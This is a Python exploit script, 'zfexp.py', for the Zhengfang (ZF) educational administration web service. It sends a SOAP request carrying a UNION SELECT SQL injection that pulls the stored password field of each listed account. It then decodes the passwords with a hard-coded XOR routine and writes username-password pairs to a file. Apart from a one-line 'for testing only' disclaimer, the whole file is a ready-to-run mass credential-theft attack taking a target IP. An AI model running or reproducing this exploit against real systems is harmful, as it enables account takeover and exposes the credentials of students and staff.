#coding=utf-8
__author__ = 'Jack  Yu'
import requests
import re
import sys

def zfDecrypt(pwd,key="Encrypt01"):
    tmp = ""
    for i in range(len(pwd)//len(key)+1):
        tmp = tmp + key
    key = tmp[0:len(pwd)]
    pwdLength = len(pwd)
    if (pwdLength % 2 ==0):
        pwd_1 = list(pwd[0:pwdLength//2])
        pwd_2 = list(pwd[pwdLength//2:pwdLength])
        pwd_1.reverse()
        pwd_2.reverse()
        pwd = ''.join(pwd_1)+''.join(pwd_2)
    array_p = []

    array_k = []



    for i in range(pwdLength):



        array_p.append(pwd[i:i+1])

        array_k.append(key[i:i+1])

        a = ord(array_p[i])^ord(array_k[i])



        if((a>=32)and(a<=126)):

            array_p[i] = chr(a)





    pwd = ''.join(array_p)



    return pwd






def setusername(username):
    data = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo">
      <xh xsi:type="xsd:string">222222' union select Null,kl ,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='{0}</xh>
      <xnxq xsi:type="xsd:string">string</xnxq>
      <strKey xsi:type="xsd:string">KKKGZ2312</strKey>
    </q1:GetStuCheckinInfo>
  </soap:Body>
</soap:Envelope>
""".format(username);
    return data


def parserpw(content):
    regexp = r"""<xh xsi:type="xsd:string">(.*)</xh>"""
    r = re.compile(regexp, re.M)
    nums  = r.findall(content)
    if nums:
        return nums[0]
    else:
        return "null"


def getpw(ip,usnme):
    header = {"Content-Type": "text/xml; charset=utf-8","SOAPAction":"\"http://www.zf_webservice.com/GetStuCheckinInfo \""};
    datas = setusername(usnme);
    r = requests.post("http://"+ip+"/service.asmx",data=datas,headers=header);

    result = zfDecrypt(parserpw(r.content))

    return result


if __name__ == "__main__":
    args = sys.argv
    if(len(args) == 2):
        f = open("username_list.txt");
        pwd = open("username_pwd.txt","w");
        print "----Username---".ljust(40),"----Password----"
        while 1:
            line = f.readline();
            if line:
                o_line = line.strip();
                obj = re.match(r"""<option value="(.*)">(.*)</option>""",o_line);
                if obj:
                    pswd = getpw(args[1],obj.group(1));
                    name = obj.group(1)+"["+obj.group(2)+"]"+":"
                    name = name.ljust(40)
                    enc =name +"\""+pswd+'\"';
                    print enc
                    pwd.writelines(enc);
            else:
                break;

        pwd.close()
    else:
        print "Usage:"+"\n" \
              "python zfexp.py TargetIP","\n"
        print "e.g:","\n" \
              "python zfexp.py 129.12.123.1","\n"
        print "本工具仅供测试使用 username_list.txt 为获取的账号列表默认为 jwc01","\n" \
              " __author__ = 'Jack Yu'"

